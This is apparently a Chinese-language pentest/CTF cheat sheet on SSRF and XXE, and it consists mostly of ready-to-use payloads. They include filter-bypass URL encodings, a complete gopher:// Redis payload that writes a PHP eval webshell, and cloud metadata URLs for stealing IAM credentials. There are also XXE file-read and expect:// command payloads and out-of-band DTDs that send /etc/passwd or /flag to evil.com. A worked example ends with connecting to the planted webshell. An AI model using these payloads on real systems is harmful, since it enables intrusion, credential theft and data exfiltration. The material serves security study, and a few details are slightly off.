---
category: "SSRF与XXE"
tags: ["SSRF", "XXE", "内网探测", "云元数据", "gopher", "dict", "Blind XXE", "OOB", "CDATA", "外部实体"]
difficulty: "高级"
---

# SSRF与XXE注入

## 1. 概述
SSRF（Server-Side Request Forgery，服务端请求伪造）和XXE（XML External Entity，XML外部实体注入）是两种利用服务端发起恶意请求/解析的攻击方式。SSRF利用服务端作为代理访问内网资源；XXE利用XML解析器的外部实体特性读取文件或发起请求。

**核心危害：**
- SSRF: 内网探测/端口扫描 → 攻击内网服务（Redis/MySQL/FastCGI） → 云环境获取元数据凭证
- XXE: 文件读取 → SSRF → DoS（XInclude/Billion Laughs）

## 2. 核心原理

### 2.1 SSRF原理
```php
// 漏洞代码
$url = $_GET['url'];
echo file_get_contents($url);  // 服务端发起HTTP请求
```
攻击者控制`url`参数指向内网地址：
```
?url=http://127.0.0.1:6379/    # 探测Redis
?url=http://169.254.169.254/   # 云元数据
```

### 2.2 XXE原理
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
XML解析器解析该XML时，将`&xxe;`替换为`/etc/passwd`的内容。

## 3. 关键技巧与Payload

### 3.1 SSRF 基础绕过与探测

**IP限制绕过（127.0.0.1封锁突破）：**
```
# 短IP表示
http://127.1/           # = 127.0.0.1
http://0/               # = 0.0.0.0

# 十进制整数IP
http://2130706433/      # = 127.0.0.1 (127*256^3 + 0*256^2 + 0*256 + 1)

# 八进制IP
http://0177.0.0.1/

# 十六进制IP
http://0x7f.0.0.1/

# 混合进制
http://0177.0x1/

# IPv6
http://[::1]/           # localhost IPv6
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL tricks
http://127.0.0.1.xip.io/   # 解析为127.0.0.1
http://localtest.me/       # 解析为127.0.0.1
http://1.1.1.1@evil.com/  # 认证格式绕过

# 短网址跳转
# 利用bit.ly等短链接

# 重定向绕过
# 在攻击者VPS上放 redirect.php
<?php header('Location: http://127.0.0.1:6379/');
# SSRF请求攻击者VPS → 302跳转到内网

# DNS重绑定
# 攻击者域名的DNS TTL=0，第一次解析到公网IP(绕过检查)，第二次解析到127.0.0.1(实际访问内网)

# 句号/点号绕过URL解析器
http://127。0。0。1/   # 中文句号(U+3002)

# host写127.0.0.1但实际不解析(HTML5)
http://evil.com#@127.0.0.1/

# 子域名绕过
http://localhost.evil.com/

# CRLF注入协议走私
http://evil.com/%0d%0aX-header: value
```

### 3.2 SSRF 协议利用

**gopher:// 协议（Redis/MySQL/FastCGI攻击核心）：**
```bash
# gopher构造方法：
# 1) 先在本地nc测试攻击payload
# 2) 将payload内容URL编码一次
# 3) 拼接到gopher
# gopher://127.0.0.1:6379/_URLENCODED_DATA

# Redis攻击（gopher:// 6379）
# 无密码Redis写WebShell
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

# Redis每个命令的URL编码构造方法：
# SET x value → *3\r\n$3\r\nSET\r\n$1\r\nx\r\n$5\r\nvalue\r\n
# 注意：每部分都要URL编码到gopher URL中
```

**dict:// 协议（端口探测与数据交互）：**
```
# 端口扫描
dict://127.0.0.1:22/            # SSH → SSH-2.0-...
dict://127.0.0.1:3306/          # MySQL
dict://127.0.0.1:6379/info      # Redis
dict://127.0.0.1:11211/stats    # Memcached

# dict协议向Redis写数据
dict://127.0.0.1:6379/set:x:"value"
```

**HTTP协议重定向链：**
```
# 利用自己的服务器做302跳转
http://evil.com/redirect?url=http://127.0.0.1:6379/
# redirect.php:
<?php header('Location: http://127.0.0.1:6379/');
```

**file:// 协议：**
```
# 读取本地文件
file:///etc/passwd
file:///var/www/html/config.php
file:///C:/Windows/win.ini
```

**netdoc:// 协议 (Java)：**
```
netdoc:///etc/passwd
```

### 3.3 云元数据攻击

**AWS EC2 Metadata:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data/

# AWS ECS 容器
http://169.254.170.2/v2/credentials/{UUID}/
```

**阿里云ECS元数据：**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/{role-name}
http://100.100.100.200/latest/user-data/
```

**腾讯云：**
```
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/{role-name}
```

**Google Cloud：**
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
# 需要 Header: Metadata-Flavor: Google
```

**Azure：**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需要 Header: Metadata: true
```

**DigitalOcean:**
```
http://169.254.169.254/metadata/v1.json
```

### 3.4 XXE 基础利用

**核心Payload（有回显）：**
```xml
<!-- 读文件 -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- PHP expect包装器RCE -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>

<!-- Java环境下利用netdoc -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**CDATA绕过特殊字符：**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % all "<!ENTITY xxe SYSTEM '%start;%file;%end;'>">
]>
<root>&xxe;</root>
```

**参数实体报错回显（本地DTD）：**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %err;
]>
<root></root>
```

### 3.5 Blind XXE (OOB外带)

**远程DTD外带：**
```xml
<!-- 目标XML -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>
<root>&exfiltrate;</root>
```

**evil.dtd（托管在攻击者VPS）：**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY exfiltrate SYSTEM 'http://evil.com/?f=%file;'>">
%all;
```
目标解析XML时：读取本地文件 → 拼接到URL → 向攻击者服务器发HTTP请求，数据在URL参数中。

**FTP外带（绕过HTTP限制）：**
```xml
<!-- ftp.dtd -->
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % all "<!ENTITY exfiltrate SYSTEM 'ftp://evil.com/%file;'>">
%all;
```

**php://filter外带（PHP环境）：**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
  <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
  %remote;
]>
```

### 3.6 XXE进阶：端口扫描与内网探测
```xml
<!-- 端口扫描（通过响应时间差异） -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root>&xxe;</root>

<!-- 遍历内网 -->
<root>&xxe1;</root>  <!-- DTD中定义多个entity -->
```

### 3.7 XInclude (无DOCTYPE情况)
```xml
<!-- 当无法控制DOCTYPE但能控制XML内容时 -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>

<!-- XInclude 配合 PHP expect -->
<xi:include parse="text" href="expect://id"/>
```

### 3.8 SVG XXE
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text>
    &amp;xxe;<!-- DTD中定义实体读取文件 -->
  </text>
</svg>
```

## 4. 常见误区与注意事项
1. **SSRF和RFI的区别**：RFI执行代码但需要在远程托管PHP文件；SSRF范围更广但更依赖可用协议。
2. **gopher:// 编码**：gopher的payload是URL编码一次的数据——注意`%0d%0a`(换行)和字符编码；某些WAF对gopher有特殊拦截。
3. **CRLF在URL中**：PHP的`file_get_contents`不支持CRLF注入，但curl/urllib/URLConnection可能有不同行为。
4. **file:// 限制**：某些语言默认不允许`file://`协议（如Java需要`-Djava.protocol.handler.pkgs`）；PHP需要`allow_url_fopen=On`。
5. **XXE的DOCTYPE预处理**：XML解析在文档解析前就处理外部实体，即使元素内容被过滤，实体仍会被替换。
6. **Blind XXE的OOB依赖**：目标需能出网连攻击者VPS；某些目标只能DNS出网时用DNS协议外带。
7. **XXE读二进制文件**：用`php://filter/convert.base64-encode`包裹避免被截断。
8. **云元数据不在所有环境可用**：传统IDC机房无元数据服务，仅各云厂商可用。
9. **offline策略**：备好Redis/FastCGI/MySQL的gopher payload脚本；准备Blind XXE的evid.dtd模板；记录各云厂商元数据地址。

## 5. 实战示例

### 示例1：SSRF + Redis 写WebShell
```
场景：website.com/curl.php?url=file_get_contents 实现，目标有Redis无密码
```
步骤：
1. 探测：`?url=http://127.0.0.1:6379/` → 返回ERR说明Redis有响应
2. 用工具生成gopher payload：
```
# redis → shell.php
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...（WebShell写入）
```
3. 访问：`?url=gopher://127.0.0.1:6379/_...(URL编码后)`
4. 连接WebShell: `http://website.com/shell.php` 密码1

### 示例2：Blind XXE 配合dnslog外带
```
场景：SOAP/XML API接口无回显
```
步骤：
1. 在dtlog.cn获取子域名（如 abcd.dnslog.cn）
2. 构造目标请求：
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://abcd.dnslog.cn/xxe">
  %xxe;
]>
<order><item>1</item></order>
```
3. DNSlog收到请求则XXE存在
4. 部署evil.dtd外带文件内容

## 6. 相关知识点
- 文件包含php://input等伪协议与SSRF组合（见05-文件包含与路径穿越）
- Java反序列化中的JNDI注入与SSRF（见06-反序列化漏洞）
- 命令注入中的curl外带（见08-命令注入与代码注入）
- 内网服务攻击FastCGI/Redis/MySQL（见10-框架与中间件漏洞）
- Python SSRF在Jinja2 SSTI中的利用（见03-服务端模板注入SSTI）
